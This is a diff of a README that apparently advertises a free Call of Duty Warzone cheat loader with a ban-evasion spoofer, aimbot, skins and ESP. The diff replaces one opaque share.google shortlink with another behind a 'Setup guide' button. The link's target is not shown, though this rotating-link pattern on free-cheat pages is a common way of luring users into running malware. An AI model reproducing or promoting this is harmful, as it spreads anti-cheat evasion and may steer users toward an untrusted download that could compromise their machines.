@@ -5,7 +5,7 @@
 One loader for Call of Duty Warzone — **spoofer, aimbot, skins and ESP**. Built for the current Ricochet patch. **Free, portable, updated per patch.**
 
 <p align="center">
-  <a href="https://share.google/jWD886tvzeLmorrSt"><img src="button.svg" alt="Setup guide" height="46"></a>
+  <a href="https://share.google/92T6Taaw7BMMQ9sPn"><img src="button.svg" alt="Setup guide" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
